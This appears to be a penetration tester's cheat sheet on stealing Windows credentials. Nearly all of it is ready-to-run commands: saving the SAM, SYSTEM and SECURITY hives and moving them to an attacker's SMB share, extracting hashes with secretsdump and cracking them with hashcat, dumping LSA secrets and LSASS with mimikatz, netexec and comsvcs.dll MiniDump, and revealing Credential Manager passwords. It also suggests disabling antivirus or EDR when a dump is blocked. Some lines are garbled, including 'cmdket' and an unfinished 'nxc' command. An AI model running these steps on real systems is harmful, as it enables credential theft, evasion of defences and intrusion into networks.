In Windows, we have different ways to extract user credentials in hash form.

Registry Hives - SAM, SYSTEM and SECURITY

-Extracting 3 hives via reg.exe
```
#Require ps/cmd in admin privilege
reg.exe save hklm\sam <abspath_desired>
reg.exe save hklm\system <abspath_desired>
reg.exe save hklm\security <abspath_desired>
```
Only sam and system is a must as with this combination, we have access to local user hashes, yet if its domain user we are after, security is also required.

We can move the files to our server with any means we like, yet if only command line is available, moving via smb is recommended.
```
move <hivefile> \\<ip>\<share>
```

After that, we can use impacket-secretsdump to extract the hashes
```
impacket-secretsdump -sam <samfile> -security <securityfile> -system <systemfile> -outputfile <fname> LOCAL
```

After that, for NTLM hash isolate the 4th column, then you can use hashcat with mode 1000 to crack all at once
```
awk -F: '{print $4}' <inputfile> | grep -v '^$' > <outputfile>
```

Finally, we can use NetExec to extract local hashes as well:
```
nxc 
```

For domain hashes, we can extract DCC2 hashes, for DCC2 hashes we can crack with hashcat in mode 2100, no extra processing is needed and we can directly supply whole hash, notice that cracking DCC2 hashes is significantly more difficult then NTLM and results in increased time

LSA Secrets:

We can sometimes dump LSA secrets by using tools, which will result in revealing some credentials in plaintext:

-Using mimikatz to dump LSA secrets:
```
#Require mimikatz on target in privilege
mimikatz.exe
privilege::debug
lsadump::secrets
```
-Using netexec to dump LSA secrets remotely:
```
netexec smb <ip> --local-auth -u <username> -p <password> --lsa
```

LSASS Dump:

By dumping LSASS, we can obtain ntlm hashes, kerberos tickets and plaintext passwords(if wdigest is actually enabled).

-Dumping LSASS

We can dump LSASS is 2 different ways depending on what kind of access we have

If we have GUI Access / RDP, then we can dump LSASS via Taskmgr:
```
1.Open Taskmgr
2.Look for "Local Security Authority Process" in Processes Tab
3.Right Click, select "Create dump file"
```

If only command line access is available, we can then dump with the help of rundll32
```
(CMD>tasklist /svc #Locate lsass.exe and note its PID
#or
(PS)Get-Process lsass # Note its Id
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsassPID> <abspath_desired> full
#Note: If blocked, try disable AV / EDR
```

-Extracting information from LSASS dump

If we are able to transfer the file back to kali, we can use pypykatz to extract info:
```
pypykatz lsa minidump <path_to_dump>
```

If such is not available, we can deploy mimikatz onto our target and extract info at the target exactly:
```
mimikatz.exe
privilege::debug
sekurlsa::minidump <lsassdump>
```

-Windows Credential Manager

Sometimes, credentials are stored in Windows Credential Manager, we can enumerate and use it directly or attempt to reveal it with mimikatz:

Revealing credential:
```
cmdket /list
#if in the result we noticed a domain password
runas /savecred /user:<domain\username> <programtorun>
Ex: runas /savecred /user:<DC01\cmason> cmd
```

Using mimikatz to reveal credentials:
```
mimikatz.exe
privilege::debug
sekurlsa::credman
```